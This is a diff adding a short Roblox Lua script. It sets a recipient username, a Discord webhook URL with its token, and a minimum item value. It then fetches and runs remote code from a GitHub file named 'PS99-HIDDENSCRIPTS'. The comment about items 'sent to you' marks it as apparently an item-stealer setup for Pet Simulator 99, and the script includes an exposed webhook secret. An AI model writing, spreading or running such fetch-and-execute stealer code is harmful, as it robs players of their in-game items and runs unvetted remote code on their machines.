@@ -1,0 +1,6 @@
+
+Username = "Bennyboibro1234"
+webhook = "https://discord.com/api/webhooks/1334824915337216050/hmOpmzUOJRTUQTnEKM09eaapvYAIwPUMm1AB9Yr5Cz4JMvKUsSjx2IVUyiK8u9ZRSX6V"
+min_rap = 500000 -- minimum rap of each item you want to get sent to you. 1 mil by default
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vax3478/Vax/refs/heads/main/PS99-HIDDENSCRIPTS", true))()
